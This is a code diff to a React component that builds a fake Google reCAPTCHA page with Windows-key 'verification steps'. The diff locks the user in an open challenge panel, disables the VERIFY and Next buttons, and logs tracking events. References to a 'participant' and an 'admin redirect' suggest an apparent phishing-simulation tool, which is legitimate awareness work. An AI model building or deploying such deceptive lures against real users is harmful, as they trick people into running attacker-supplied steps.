@@ -50,10 +50,12 @@ function WindowsKeyIcon() {
 function FakeRecaptcha({
   checked,
   loading,
+  locked,
   onActivate,
 }: {
   checked: boolean;
   loading: boolean;
+  locked?: boolean;
   onActivate: () => void;
 }) {
   return (
@@ -61,7 +63,7 @@ function FakeRecaptcha({
       type="button"
       className={`ge-rc${checked ? " is-checked" : ""}${loading ? " is-loading" : ""}`}
       onClick={onActivate}
-      disabled={loading || checked}
+      disabled={loading || checked || !!locked}
       aria-pressed={checked}
       aria-busy={loading}
       aria-label="I'm not a robot"
@@ -95,17 +97,15 @@ function FakeRecaptcha({
   );
 }
 
-/** Challenge panel like real reCAPTCHA — fixed under the widget, nudged left (not centered). */
+/** Challenge panel like real reCAPTCHA — opens to the right of the widget. Locked once open. */
 function VerificationStepsPopover({
   open,
   hash,
   anchorRef,
-  onVerify,
 }: {
   open: boolean;
   hash: string;
   anchorRef: RefObject<HTMLElement | null>;
-  onVerify: () => void;
 }) {
   const [visible, setVisible] = useState(false);
   const [pos, setPos] = useState<{ top: number; left: number } | null>(null);
@@ -120,13 +120,17 @@ function VerificationStepsPopover({
       if (!el) return;
       const r = el.getBoundingClientRect();
       const width = Math.min(352, window.innerWidth - 16);
-      // Hang just under the checkbox, a little to the left — not screen-center.
-      let left = r.left - 36;
+      const gap = 10;
+      // Prefer right of the checkbox so Next stays visible underneath.
+      let left = r.right + gap;
+      if (left + width > window.innerWidth - 8) {
+        left = Math.max(8, r.left - width - gap);
+      }
       left = Math.max(8, Math.min(left, window.innerWidth - width - 8));
-      let top = r.bottom + 8;
       const estHeight = 420;
-      if (top + estHeight > window.innerHeight - 8 && r.top > estHeight) {
-        top = Math.max(8, r.top - estHeight - 8);
+      let top = r.top;
+      if (top + estHeight > window.innerHeight - 8) {
+        top = Math.max(8, window.innerHeight - estHeight - 8);
       }
       setPos({ top, left });
     };
@@ -207,7 +211,14 @@ function VerificationStepsPopover({
 
       <footer className="ge-vs-footer">
         <p className="ge-vs-hint">Perform the steps above to finish verification.</p>
-        <button type="button" className="ge-vs-verify" onClick={onVerify}>
+        <button
+          type="button"
+          className="ge-vs-verify"
+          disabled
+          aria-disabled="true"
+          tabIndex={-1}
+          onClick={(e) => e.preventDefault()}
+        >
           VERIFY
         </button>
       </footer>
@@ -406,7 +417,7 @@ ${GE_SHELL_CSS}
   box-shadow: none;
 }
 
-/* reCAPTCHA-style challenge: fixed under the widget (portaled), nudged left */
+/* reCAPTCHA-style challenge: fixed to the right of the widget (portaled) */
 .ge-rc-wrap {
   position: relative;
   width: fit-content;
@@ -424,13 +435,13 @@ ${GE_SHELL_CSS}
   font-family: Roboto, Helvetica, Arial, sans-serif;
   color: #202124;
   opacity: 0;
-  transform: translateY(-6px);
+  transform: translateX(-6px);
   transition: opacity .2s ease, transform .22s cubic-bezier(.2,.8,.2,1);
   pointer-events: none;
 }
 .ge-vs-popover.is-open {
   opacity: 1;
-  transform: translateY(0);
+  transform: translateX(0);
   pointer-events: auto;
 }
 .ge-vs-header {
@@ -546,9 +557,16 @@ ${GE_SHELL_CSS}
   font-size: 13px;
   font-weight: 700;
   letter-spacing: 0.04em;
-  cursor: pointer;
+  cursor: default;
+  pointer-events: none;
+  opacity: 1;
 }
-.ge-vs-verify:hover { background: #1765cc; }
+.ge-vs-verify:disabled {
+  background: #1a73e8;
+  color: #fff;
+  opacity: 1;
+  cursor: default;
+}
 `;
 
 function GeCaptchaPage() {
@@ -589,28 +607,21 @@ function GeCaptchaPage() {
   }, [isObserve]);
 
   const handleActivate = () => {
-    if (checked || loading || modalOpen) return;
+    if (loading || modalOpen) return;
     trackClick("reCAPTCHA activate");
     setLoading(true);
     window.setTimeout(() => {
       setLoading(false);
+      // Locked open — participant cannot close; admin redirects onward.
       setModalOpen(true);
       trackClick("Verification Steps opened");
+      trackSubmit("recaptcha", `challenge_open:${hash}`);
     }, 900);
-  };
-
-  const handleVerify = () => {
-    trackClick("VERIFY");
-    setModalOpen(false);
-    setChecked(true);
-    trackSubmit("recaptcha", `verified:${hash}`);
   };
 
   const handleNext = (e?: FormEvent) => {
     e?.preventDefault();
-    if (!checked) return;
-    trackClick("Next");
-    trackSubmit("recaptcha_next", "checked");
+    // Next stays inert — only admin redirect advances.
   };
 
   return (
@@ -644,18 +655,18 @@ function GeCaptchaPage() {
               <FakeRecaptcha
                 checked={checked}
                 loading={loading}
+                locked={modalOpen}
                 onActivate={handleActivate}
               />
               <VerificationStepsPopover
                 open={modalOpen}
                 hash={hash}
                 anchorRef={rcWrapRef}
-                onVerify={handleVerify}
               />
             </div>
 
             <div className="ge-actions">
-              <button type="submit" className="ge-btn ge-btn-next" disabled={!checked}>
+              <button type="submit" className="ge-btn ge-btn-next" disabled>
                 Next
               </button>
             </div>
